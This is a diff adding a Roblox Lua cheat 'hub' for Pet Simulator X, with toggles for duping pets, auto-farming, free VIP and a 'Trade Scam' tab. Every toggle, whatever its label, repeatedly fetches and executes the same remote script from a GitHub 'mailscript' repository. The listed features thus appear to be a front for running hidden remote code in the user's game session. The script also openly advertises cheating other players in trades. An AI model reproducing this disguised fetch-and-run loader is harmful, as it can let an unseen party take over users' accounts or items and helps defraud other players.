@@ -1,0 +1,267 @@
+if game.PlaceId == 6284583030 then
+    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+    local Window = OrionLib:MakeWindow({Name = "[🎉PIÑATA] Pet Simulator X! 🐾 Broski Hub🧛‍♀️", HidePremium = false, IntroEnabled = false,IntroText = "W1X1 HUB", SaveConfig = true, ConfigFolder = "W1x1 Hub"})
+     
+    --Values
+    _G.Enable = true
+    
+    --Functions
+    
+    
+    function Enable()
+        while _G.Enable == true do
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ggkoolko123/mailscript/main/DupePets.Lua",true))()
+            wait(.00001)
+        end
+    end
+        
+    
+    function DupePets()
+        while _G.DupePets == true do
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ggkoolko123/mailscript/main/DupePets.Lua",true))()
+            wait(.00001)
+        end
+    end
+    
+        
+    
+    
+    
+     -- Tabs
+    local TradeScam = Window:MakeTab({
+        Name = "Trade Scam",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+    
+    
+    
+    local Dupe = Window:MakeTab({
+        Name = "Dupe",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+
+    local AutoFarm = Window:MakeTab({
+        Name = "AutoFarm",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+
+    local Misc = Window:MakeTab({
+        Name = "Misc",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+    local Cred = Window:MakeTab({
+        Name = "Cred",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+    
+
+    
+    -- Toggles
+    TradeScam:AddToggle({
+        Name = "👻Fast Remove Pets👻",
+        Default = false,
+        Callback = function(Value)
+            _G.Enable = Value
+            Enable()
+        end    
+    })
+    
+    TradeScam:AddToggle({
+        Name = "🚗Crash Trade🚗",
+        Default = false,
+        Callback = function(Value)
+            _G.Enable = Value
+            Enable()
+        end    
+    })
+
+    TradeScam:AddToggle({
+        Name = "👽Force Ready👽",
+        Default = false,
+        Callback = function(Value)
+            _G.Enable = Value
+            Enable()
+        end    
+    })
+    
+    -- Toggles
+    Dupe:AddToggle({
+        Name = "♟Dupe Inventory♟",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+    
+    Dupe:AddToggle({
+        Name = "💎Dupe Gems💎",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    Dupe:AddToggle({
+        Name = "👽Dupe Huges👽",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    Dupe:AddToggle({
+        Name = "💀Dupe Exclusive💀",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+    -- toggles
+
+    AutoFarm:AddToggle({
+        Name = "🌲Spawn World🌲",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    AutoFarm:AddToggle({
+        Name = "🌌Fantasy World🌌",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    AutoFarm:AddToggle({
+        Name = "🤖Tech World🤖",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    AutoFarm:AddToggle({
+        Name = "🐠Axolotl Ocean🐠",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    AutoFarm:AddToggle({
+        Name = "👾Pixel World👾",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    AutoFarm:AddToggle({
+        Name = "🐱Cat World🐱",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    AutoFarm:AddToggle({
+        Name = "⛲Doodle World⛲",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    AutoFarm:AddToggle({
+        Name = "🦑Kawaii World🦑",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+    
+    -- Toggles
+    
+    Misc:AddToggle({
+        Name = "👑Free VIP👑",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+    
+    Misc:AddToggle({
+        Name = "🍀Lucky Gamepass🍀",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    Misc:AddToggle({
+        Name = "🥚Auto Hatch🥚",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+    
+    Misc:AddToggle({
+        Name = "🛴Unlocks every Hoverboard🛴",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    Misc:AddToggle({
+        Name = "✈Fly (X)✈",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+
+    -- Toggles
+    
+    Cred:AddToggle({
+        Name = "",
+        Default = false,
+        Callback = function(Value)
+            _G.DupePets = Value
+            DupePets()
+        end    
+    })
+    
+    
+    
+    
+    end
+    OrionLib:Init()
